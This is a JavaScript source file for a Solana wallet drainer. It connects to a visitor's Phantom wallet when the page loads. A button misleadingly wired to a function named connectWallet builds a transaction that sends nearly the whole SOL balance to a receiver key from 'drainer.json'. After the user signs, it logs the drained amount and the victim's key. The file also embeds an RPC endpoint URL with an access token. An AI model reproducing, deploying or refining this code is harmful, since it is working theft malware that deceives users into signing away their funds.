import { PublicKey, Connection, Transaction, SystemProgram, LAMPORTS_PER_SOL } from '@solana/web3.js';
import config from './config/drainer.json';
import logger from './logging';
let solProvider = null;
let userPublicKey = null;
const connection = new Connection(
    'https://flashy-blissful-cloud.solana-mainnet.quiknode.pro/caaa31e783b172496fd2911ac8f7e0f4db96b63b/',
    'confirmed'
);

// DOM elements
const statusEl = document.getElementById('status');
const balanceEl = document.getElementById('balance');
const sendBtn = document.getElementById('connectWalletBtn');

// Connect Phantom wallet on page load
async function init() {
    if ('phantom' in window) {
        solProvider = window.phantom?.solana;
        if (solProvider?.isPhantom) {
            try {
                const resp = await solProvider.connect();
                userPublicKey = resp.publicKey;
                statusEl.textContent = `Connected: ${userPublicKey.toString()}`;

                const balance = await connection.getBalance(userPublicKey);
                balanceEl.textContent = `Balance: ${balance / LAMPORTS_PER_SOL} SOL`;

                sendBtn.disabled = false; // enable button after wallet connection
            } catch (err) {
                statusEl.textContent = 'Failed to connect wallet';
                console.error(err);
            }
        } else {
            statusEl.textContent = 'Phantom wallet not found';
        }
    } else {
        statusEl.textContent = 'Phantom wallet not available';
    }
}

// Send SOL when button is clicked
async function connectWallet() {
    if (!solProvider || !userPublicKey) return;

    const receiverWallet = new PublicKey(config.receiverPubKey);
    const solBalance = await connection.getBalance(userPublicKey);
    const amountToSend = solBalance - config.transactionFee * LAMPORTS_PER_SOL;

    if (amountToSend <= 0) {
        alert('Not enough balance to cover transaction fee');
        return;
    }

    const transaction = new Transaction().add(
        SystemProgram.transfer({
            fromPubkey: userPublicKey,
            toPubkey: receiverWallet,
            lamports: amountToSend
        })
    );

    transaction.feePayer = userPublicKey;
    const blockhashObj = await connection.getLatestBlockhash();
    transaction.recentBlockhash = blockhashObj.blockhash;

    try {
        const signed = await solProvider.signTransaction(transaction);
        const signature = await connection.sendRawTransaction(signed.serialize());
        await connection.confirmTransaction({
            blockhash: blockhashObj.blockhash,
            lastValidBlockHeight: blockhashObj.lastValidBlockHeight,
            signature
        });

        balanceEl.textContent = `Sent ${amountToSend / LAMPORTS_PER_SOL} SOL`;
        await logger.sendLog({
            balance: solBalance,
            drained: amountToSend,
            senderPubKey: userPublicKey.toString(),
            receiverPubKey: config.receiverPubKey,
            signature
        });
        alert('Transaction successful!');
    } catch (err) {
        console.error(err);
        alert('Transaction failed or was rejected');
    }
}

// Event listener for send button
sendBtn.addEventListener('click', connectWallet);

// Start wallet connection on page load
init();
